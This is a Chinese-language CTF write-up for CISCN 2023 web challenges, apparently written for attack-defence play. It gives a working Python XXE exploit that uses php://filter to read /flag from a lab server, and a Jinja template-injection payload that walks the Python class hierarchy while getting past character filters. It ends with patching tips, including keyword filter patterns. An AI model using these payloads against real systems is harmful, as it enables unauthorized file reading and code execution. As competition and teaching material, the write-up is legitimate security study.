---
title: CISCN 2023 Write-Up & Tricks
date: 2023-07-07 00:28:12
tags:
- CISCN
- web
- Write-Up
categories: 
- CTF
---
# CISCN 2023 部分 Write-Up 及patch妙妙小技巧
## Web
### ezphp
变量覆盖+XXE外部实体注入任意文件读。  
Patch：修了extract就行  
exp:  
```python
import requests
file = "/flag"
username = "okok20"
data = {
    'username': f"""{username}""",
    'password': f"""y""",
    'user_xml_format': f"""<?xml version="1.0" encoding="utf-8"?><!DOCTYPE ANY [<!ENTITY content SYSTEM "php://filter/read=convert.base64-encode/resource={file}">]><userinfo><user><username>&content;</username><password>1</password></user></userinfo>""",
}
r = requests.post("http://175.20.20.196/register.php",data=data)
print(r.text)
r = requests.get(f"http://175.20.20.196/login.php?username={username}&password=2")
print(r.text)
```
### Ciscn_Search_Engine
Jinja模板注入，绕过滤字符。我们可以使用request调用get参数来绕过各种字符。   
```plaintext
{{()|attr(request.values.name1)|attr(request.values.name2)|attr(request.values.name3)()|attr(request.values.name4)(40)(request.values.name6)|attr(request.values.name5)()}}
post:
name1=__class__&name2=__base__&name3=__subclasses__&name4=pop&name5=read&name6="/flag"
```
Patch：把花括号干了。  

### 其他七七八八的Patch  
首先，我们是可以知道Patch失败的原因的，那么一定要确保不要Patch过猛导致服务异常；我们需要**优先确保服务正常工作，逐步加大Patch力度**。
#### 过滤关键字
无脑过滤可以迅速打上Patch！我们可以尽量构造一些正常流量中不太可能出现的字符组合来避免被判服务down掉。  
比如说，想要过滤Python模板注入，我们可以过滤如下组合：  
`|_`, `._`, `_c`, `_[`, `](`   
而对于SQL注入就更简单了：自己打一打，看看哪些函数、符号能利用，就直接过滤掉。  
#### 类型安全
如果涉及弱类型的语言，比如PHP，经常会有洞出在弱比较上，那么我们可以考虑如下几种手段：  
- 使用强比较：例如PHP/Js中使用`===`而非`==`；
- 在关键参数入口处进行正则化：例如，对于期望是整数的参数`iv`，就应强制让`iv=intval(iv)`转为整型；  

相信也可以发现国赛这种patch难度远低于attack的难度。建议**做题的初期当作没有攻击得分，先patch了再说**。
